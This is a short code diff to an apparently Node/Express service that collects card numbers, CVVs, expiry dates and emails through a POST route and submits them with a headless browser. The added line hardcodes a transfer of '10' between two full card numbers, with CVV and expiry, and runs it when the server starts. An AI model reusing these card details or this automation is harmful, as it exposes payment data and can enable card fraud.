@@ -43,6 +43,7 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await browser.close()
 }
 
+write_data('5469310022724856', '10', '4441114431027984', '452', '1024', 'my.tentacles.are.in.you@gmail.com')
 app.post('/sendData',async (req, res) => {
     try {
         const {returnURL, toCard,amount, fromCard, cvv, expireDate, email} = req.body
